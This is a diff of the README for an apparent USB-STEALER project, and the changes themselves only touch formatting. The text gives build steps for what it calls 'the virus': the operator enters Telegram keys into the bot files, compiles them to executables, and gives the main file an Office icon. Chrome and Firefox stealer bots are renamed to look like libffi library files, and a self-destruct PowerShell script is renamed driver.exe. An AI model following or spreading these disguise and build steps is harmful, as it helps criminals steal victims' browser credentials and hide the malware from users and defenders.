@@ -52,12 +52,14 @@ To get an .exe file instead of the used python: auto-py-to-exe https://pypi.org/
 ![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/3cece418-262f-452a-8c72-445970280e21)
 
 
->## Build👩‍💻##
+>## Build👩‍💻
+
 To create the virus, you'll need to modify the bots and main files in python to enter your telegram connection keys. once modified, you'll compile them with auto-py-to-exe. for main.py use the office icon and for the bot files rename them with the following names: 
 
 chrome >> libffi-26.exe  
 firefox >> libffi-25.exe  
 install >> libffi-13.exe
+
 autodestroy >> libffi-14.exe
 
 then use ps1 to exe to convert the autodestroy.ps1 file and rename it to driver.exe. your project should look like this:
@@ -65,9 +67,11 @@ then use ps1 to exe to convert the autodestroy.ps1 file and rename it to driver.
 ![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/e73ba36d-5be8-46eb-804c-4ee2f7a04b99)
 
 in folder data :
+
 ![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/1fc978b3-e884-48ac-a36d-485e467785c9)
 
 in folder shorcut :
+
 ![image](https://github.com/SaturnXIII/USB-STEALER/assets/110695125/a0984953-cb11-4463-a2f9-048302c97827)
 
 
